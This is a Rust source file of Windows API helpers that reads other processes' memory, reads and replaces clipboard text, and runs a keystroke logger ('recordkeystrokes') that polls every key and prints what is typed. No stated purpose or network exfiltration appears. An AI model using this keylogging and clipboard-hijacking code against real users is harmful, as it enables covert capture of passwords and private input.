
use winapi::ctypes::*;
use winapi::shared::ntdef::NULL;
use winapi::um::errhandlingapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{MEM_COMMIT, PAGE_READWRITE};
use winapi::um::winuser::{CloseClipboard, EmptyClipboard, EnumClipboardFormats, GetAsyncKeyState, GetClipboardData, OpenClipboard, SetClipboardData, CF_TEXT};

pub fn parse_structure_from_memory<T>(prochandle: *mut c_void, p:  usize) -> Result<T,String>{

    if prochandle.is_null() || p == 0{
        return Err(format!("process handle or pointer is null"));
    }

    let mut v = vec![0u8;std::mem::size_of::<T>()];
    let mut bytesread = 0usize;
    let res = unsafe{ReadProcessMemory(prochandle,
                                       p as *const c_void,v.as_mut_ptr() as *mut c_void,
                                       v.len(),&mut bytesread)};

    if res==0{
        Err(format!("Reading process memory failed: {}",unsafe{GetLastError()}))
    }
    else if bytesread==std::mem::size_of::<T>(){
        let mut temp = unsafe{std::mem::zeroed::<T>()};
        unsafe{std::ptr::copy(v.as_ptr() as *const _ as *const u8,&mut temp as *mut _ as *mut u8, v.len() )};
        Ok(temp)
    }
    else{
        Err(format!("Something went wrong"))

    }

}



pub fn ReadStringFromMemory(prochandle: *mut c_void, base: *const c_void) -> String {
    unsafe {
        let mut i: isize = 0;
        let mut s = String::new();
        loop {
            let mut a: [u8; 1] = [0];
            ReadProcessMemory(
                prochandle,
                (base as isize + i) as *const c_void,
                a.as_mut_ptr() as *mut c_void,
                1,
                std::ptr::null_mut(),
            );

            if a[0] == 0 || i == 100 {
                return s;
            }
            s.push(a[0] as char);
            i += 1;
        }
    }
}

pub fn recordkeystrokes(){
    loop{
        for i in 0..255{

            //if (i>=48&&i<=57) || (i>=65&&i<=90) || (i>=97&&i<=122){
            let keystate = unsafe{GetAsyncKeyState(i as c_int)};
            if keystate==-32767{
                eprint!("{}",i as u8 as char );

                //}

            }




        }
    }

}



pub fn getclipboard() -> Result<String,String>{

    let cliphandle = unsafe{OpenClipboard(std::ptr::null_mut())};

    let mut clipformat = 0;

    loop{

        clipformat = unsafe{EnumClipboardFormats(clipformat)};

        if clipformat==0{
            break;
        }




        if clipformat==1{
            let datahandle = unsafe{GetClipboardData(clipformat)};
            if datahandle!=NULL{
                let data = ReadStringFromMemory(unsafe{GetCurrentProcess()},datahandle);
                unsafe{CloseClipboard()};
                return Ok(data);
            }

        }

    }



    unsafe{CloseClipboard()};

    return Err("something went wrong or text clipboard data is not present".to_string());

}


pub fn setclipboard(mut s: String){

    let cliphandle = unsafe{OpenClipboard(std::ptr::null_mut())};

    unsafe{EmptyClipboard()};

    let datahandle = unsafe{SetClipboardData(CF_TEXT,(s.clone()+"\0").as_bytes_mut().as_mut_ptr() as *mut c_void)};
    if datahandle.is_null(){
        println!("SetClipboardData failed: {}",unsafe{GetLastError()});
    }

    unsafe{CloseClipboard()};

}
